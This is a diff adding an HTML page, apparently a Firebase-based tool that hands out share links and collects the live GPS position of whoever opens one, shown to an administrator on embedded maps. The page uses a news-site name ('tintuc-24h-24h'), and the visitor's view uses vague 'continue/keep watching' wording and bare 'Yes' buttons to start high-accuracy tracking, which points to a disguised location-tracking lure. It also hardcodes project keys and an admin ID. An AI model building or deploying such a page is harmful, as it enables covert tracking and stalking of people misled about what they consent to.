@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width,initial-scale=1">
+<title>tintuc-24h-24h</title>
+
+<style>
+body {
+  font-family: Arial, sans-serif;
+  max-width: 700px;
+  margin: auto;
+  padding: 18px;
+  background: #f3f5f7;
+  color: #17202a;
+}
+.card {
+  background: white;
+  padding: 18px;
+  border-radius: 12px;
+  margin: 14px 0;
+  box-shadow: 0 2px 8px #0001;
+}
+input,button {
+  box-sizing: border-box;
+  width: 100%;
+  padding: 13px;
+  margin: 7px 0;
+  border-radius: 8px;
+  border: 1px solid #bbb;
+  font-size: 16px;
+}
+button {
+  background: #1769e0;
+  color: white;
+  border: 0;
+  font-weight: bold;
+}
+.stop { background: #c62828; }
+.small { font-size: 13px; color: #555; }
+a { overflow-wrap: anywhere; }
+#map {
+  width: 100%;
+  height: 300px;
+  border: 0;
+  border-radius: 8px;
+}
+.hidden { display: none; }
+</style>
+</head>
+
+<body>
+<h2>GPS Share</h2>
+<p class="small">
+đồng ý xem.
+</p>
+
+<div id="status" class="card">
+Đang khởi tạo...
+</div>
+
+<!-- ADMIN -->
+<div id="admin" class="card hidden">
+<h3>Trang quản trị</h3>
+
+<div id="loginBox">
+<input id="email"
+       type="email"
+       placeholder="Email quản trị">
+<input id="password"
+       type="password"
+       placeholder="Mật khẩu">
+<button onclick="login()">Đăng nhập</button>
+</div>
+
+<div id="adminPanel" class="hidden">
+<p id="adminEmail"></p>
+<button onclick="createSession()">
+Tạo link chia sẻ mới
+</button>
+<div id="newLink"></div>
+<h3>Các phiên chia sẻ</h3>
+<div id="sessions"></div>
+<button class="stop" onclick="logout()">
+Đăng xuất
+</button>
+</div>
+</div>
+
+<!-- PARTNER -->
+<div id="partner" class="card hidden">
+<h3>tiếp tục</h3>
+
+<p>
+Xem tiếp
+</p>
+
+<p>
+Bạn có thể dừng bất cứ lúc nào.
+</p>
+
+<label>
+<input id="consent" type="checkbox"
+       style="width:auto">
+Yes
+</label>
+
+<button onclick="startShare()">
+Yes
+</button>
+
+<button class="stop" onclick="stopShare()">
+No
+</button>
+
+<div id="partnerInfo"></div>
+</div>
+
+<script type="module">
+import {
+  initializeApp
+} from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+
+import {
+  getAuth,
+  signInWithEmailAndPassword,
+  signInAnonymously,
+  onAuthStateChanged,
+  signOut
+} from "https://www.gstatic.com/firebasejs/10.14.1/firebase-auth.js";
+
+import {
+  getFirestore,
+  doc,
+  setDoc,
+  updateDoc,
+  getDoc,
+  collection,
+  query,
+  orderBy,
+  onSnapshot,
+  serverTimestamp
+} from "https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js";
+
+/* =====================================
+   THAY CẤU HÌNH BẰNG THÔNG TIN FIREBASE
+   ===================================== */
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBnGoIlpGout6zIhDz_q0aGWiV7rEcK0R4",
+  authDomain: "tintuc-24h-24h.firebaseapp.com",
+  projectId: "tintuc-24h-24h",
+  storageBucket: "tintuc-24h-24h.firebasestorage.app",
+  messagingSenderId: "80201408568",
+  appId: "1:80201408568:web:a61e0fb74188b27cb206cd",
+  measurementId: "G-HLP5F9DSCL"
+};
+/* UID quản trị */
+const ADMIN_UID = "kZ3VZh4kqkfDKxc67dNkz4zl98g2";
+/* ===================================== */
+
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
+
+const $ = id => document.getElementById(id);
+
+let currentUser = null;
+let currentSession = null;
+let watchId = null;
+let adminUnsub = null;
+
+const params = new URLSearchParams(location.search);
+const shareId = params.get("share");
+
+function say(message) {
+  $("status").textContent = message;
+}
+
+function randomId() {
+  const bytes = new Uint8Array(24);
+  crypto.getRandomValues(bytes);
+  return Array.from(bytes)
+    .map(x => x.toString(16).padStart(2,"0"))
+    .join("");
+}
+
+function sessionRef(id) {
+  return doc(db, "sessions", id);
+}
+
+/* =====================================
+   KHỞI TẠO
+   ===================================== */
+
+if (shareId) {
+  $("partner").classList.remove("hidden");
+  say("Đang mở trang chia sẻ vị trí...");
+} else {
+  $("admin").classList.remove("hidden");
+  say("Đăng nhập tài khoản quản trị để tiếp tục.");
+}
+
+onAuthStateChanged(auth, user => {
+  currentUser = user;
+
+  if (shareId) {
+    return;
+  }
+
+  if (user && user.uid === ADMIN_UID) {
+    $("loginBox").classList.add("hidden");
+    $("adminPanel").classList.remove("hidden");
+    $("adminEmail").textContent =
+      "Đã đăng nhập: " + (user.email || user.uid);
+    listenSessions();
+  } else {
+    $("loginBox").classList.remove("hidden");
+    $("adminPanel").classList.add("hidden");
+  }
+});
+
+/* =====================================
+   ĐĂNG NHẬP QUẢN TRỊ
+   ===================================== */
+
+window.login = async function() {
+  try {
+    const email = $("email").value.trim();
+    const password = $("password").value;
+
+    await signInWithEmailAndPassword(
+      auth, email, password
+    );
+
+    say("Đăng nhập thành công.");
+  } catch (e) {
+    say("Đăng nhập thất bại: " + e.message);
+  }
+};
+
+window.logout = async function() {
+  if (adminUnsub) adminUnsub();
+  await signOut(auth);
+};
+
+/* =====================================
+   TẠO PHIÊN VÀ LINK ĐỐI TÁC
+   ===================================== */
+
+window.createSession = async function() {
+  try {
+    if (!currentUser ||
+        currentUser.uid !== ADMIN_UID) {
+      throw new Error("Chưa đăng nhập quản trị.");
+    }
+
+    const id = randomId();
+
+    await setDoc(sessionRef(id), {
+      adminUid: currentUser.uid,
+      participantUid: null,
+      status: "pending",
+      latitude: null,
+      longitude: null,
+      accuracy: null,
+      updatedAt: null,
+      createdAt: serverTimestamp()
+    });
+
+    const link = location.origin + location.pathname
+      + "?share=" + id;
+
+    $("newLink").innerHTML = "";
+
+    const a = document.createElement("a");
+    a.href = link;
+    a.textContent = link;
+    a.target = "_blank";
+    $("newLink").appendChild(a);
+
+    const copy = document.createElement("button");
+    copy.textContent = "Sao chép link";
+    copy.onclick = async () => {
+      await navigator.clipboard.writeText(link);
+      copy.textContent = "Đã sao chép";
+    };
+    $("newLink").appendChild(copy);
+
+    say("Đã tạo link chia sẻ mới.");
+  } catch(e) {
+    say("Không tạo được link: " + e.message);
+  }
+};
+
+/* =====================================
+   QUẢN TRỊ: XEM DANH SÁCH VỊ TRÍ
+   ===================================== */
+
+function listenSessions() {
+  if (adminUnsub) adminUnsub();
+
+  const q = query(
+    collection(db, "sessions"),
+    orderBy("createdAt", "desc")
+  );
+
+  adminUnsub = onSnapshot(q, snapshot => {
+    const root = $("sessions");
+    root.innerHTML = "";
+
+    snapshot.forEach(item => {
+      const d = item.data();
+      const id = item.id;
+
+      const box = document.createElement("div");
+      box.className = "card";
+
+      const title = document.createElement("h4");
+      title.textContent = "Phiên " + id.slice(0,12);
+      box.appendChild(title);
+
+      const state = document.createElement("p");
+      state.textContent = "Trạng thái: " + d.status;
+      box.appendChild(state);
+
+      if (d.latitude != null &&
+          d.longitude != null) {
+        const coords = document.createElement("p");
+        coords.textContent =
+          "Vĩ độ: " + d.latitude +
+          " | Kinh độ: " + d.longitude +
+          " | Sai số: " +
+          Math.round(d.accuracy || 0) + " m";
+        box.appendChild(coords);
+
+        const time = document.createElement("p");
+        time.textContent = "Cập nhật: " +
+          (d.updatedAt?.toDate
+            ? d.updatedAt.toDate().toLocaleString()
+            : "Đang cập nhật");
+        box.appendChild(time);
+
+        const map = document.createElement("iframe");
+        map.id = "map-" + id;
+        map.src = "https://maps.google.com/maps?q="
+          + d.latitude + "," + d.longitude
+          + "&z=16&output=embed";
+        map.allowFullscreen = true;
+        map.loading = "lazy";
+        map.referrerPolicy = "no-referrer-when-downgrade";
+        map.style.width = "100%";
+        map.style.height = "250px";
+        map.style.border = "0";
+        box.appendChild(map);
+
+        const open = document.createElement("a");
+        open.href = "https://maps.google.com/?q="
+          + d.latitude + "," + d.longitude;
+        open.target = "_blank";
+        open.textContent = "Mở trên Google Maps";
+        box.appendChild(open);
+      }
+
+      const stop = document.createElement("button");
+      stop.className = "stop";
+      stop.textContent = "Thu hồi phiên";
+      stop.onclick = async () => {
+        if (!confirm("Thu hồi phiên chia sẻ này?"))
+          return;
+        await updateDoc(sessionRef(id), {
+          status: "revoked"
+        });
+      };
+      box.appendChild(stop);
+
+      root.appendChild(box);
+    });
+  }, error => {
+    say("Lỗi đọc dữ liệu: " + error.message);
+  });
+}
+
+/* =====================================
+   ĐỐI TÁC: XÁC THỰC PHIÊN
+   ===================================== */
+
+async function preparePartner() {
+  try {
+    if (!auth.currentUser) {
+      await signInAnonymously(auth);
+    }
+
+    const user = auth.currentUser;
+    const ref = sessionRef(shareId);
+    const snap = await getDoc(ref);
+
+    if (!snap.exists()) {
+      say("Link không tồn tại hoặc đã bị xóa.");
+      return;
+    }
+
+    const data = snap.data();
+
+    if (data.status === "revoked" ||
+        data.status === "stopped") {
+      say("Phiên chia sẻ đã kết thúc.");
+      return;
+    }
+
+    if (data.participantUid &&
+        data.participantUid !== user.uid) {
+      say("Phiên đã được nhận trên thiết bị khác.");
+      return;
+    }
+
+    if (!data.participantUid) {
+      await updateDoc(ref, {
+        participantUid: user.uid,
+        status: "ready"
+      });
+    }
+
+    currentSession = shareId;
+    $("partnerInfo").textContent =
+      "Bạn có thể bắt đầu chia sẻ khi đã đồng ý.";
+    say("Đã xác nhận phiên. Chờ bạn đồng ý.");
+  } catch(e) {
+    say("Không thể mở phiên: " + e.message);
+  }
+}
+
+/* =====================================
+   ĐỐI TÁC: BẮT ĐẦU CHIA SẺ GPS
+   ===================================== */
+
+window.startShare = async function() {
+  try {
+    if (!$("consent").checked) {
+      alert("Bạn cần xác nhận đồng ý trước.");
+      return;
+    }
+
+    if (!navigator.geolocation) {
+      throw new Error("Trình duyệt không hỗ trợ GPS.");
+    }
+
+    if (!currentUser) {
+      await signInAnonymously(auth);
+    }
+
+    const snap = await getDoc(sessionRef(shareId));
+
+    if (!snap.exists()) {
+      throw new Error("Phiên chia sẻ không tồn tại.");
+    }
+
+    const data = snap.data();
+
+    if (data.status === "revoked" ||
+        data.status === "stopped") {
+      throw new Error("Phiên đã bị thu hồi.");
+    }
+
+    if (data.participantUid !== auth.currentUser.uid) {
+      throw new Error("Phiên không thuộc thiết bị này.");
+    }
+
+    currentSession = shareId;
+
+    // Theo dõi vị trí khi trình duyệt hoạt động.
+    watchId = navigator.geolocation.watchPosition(
+      async position => {
+        try {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+
+          await updateDoc(sessionRef(currentSession), {
+            latitude: lat,
+            longitude: lon,
+            accuracy: accuracy,
+            status: "sharing",
+            updatedAt: serverTimestamp()
+          });
+
+          $("partnerInfo").textContent =
+            "Đang chia sẻ vị trí. Độ chính xác khoảng "
+            + Math.round(accuracy) + " mét.";
+        } catch(e) {
+          $("partnerInfo").textContent =
+            "Không gửi được dữ liệu. " + e.message;
+        }
+      },
+      error => {
+        $("partnerInfo").textContent =
+          "Không lấy được GPS: " + error.message;
+      },
+      {
+        enableHighAccuracy: true,
+        maximumAge: 0,
+        timeout: 20000
+      }
+    );
+
+    say("Đang chia sẻ vị trí. Bạn có thể dừng bất cứ lúc nào.");
+  } catch(e) {
+    say("Không thể bắt đầu: " + e.message);
+  }
+};
+
+/* =====================================
+   ĐỐI TÁC: DỪNG CHIA SẺ
+   ===================================== */
+
+window.stopShare = async function() {
+  if (watchId !== null) {
+    navigator.geolocation.clearWatch(watchId);
+    watchId = null;
+  }
+
+  try {
+    if (currentSession && auth.currentUser) {
+      await updateDoc(sessionRef(currentSession), {
+        status: "stopped"
+      });
+    }
+    $("partnerInfo").textContent =
+      "Bạn đã dừng chia sẻ vị trí.";
+    say("Đã dừng chia sẻ.");
+  } catch(e) {
+    say("Đã ngừng theo dõi trên thiết bị. "
+      + "Không gửi được trạng thái dừng lên máy chủ.");
+  }
+};
+
+/* =====================================
+   KHỞI ĐỘNG TRANG ĐỐI TÁC
+   ===================================== */
+
+if (shareId) {
+  preparePartner();
+}
+</script>
+</body>
+</html>
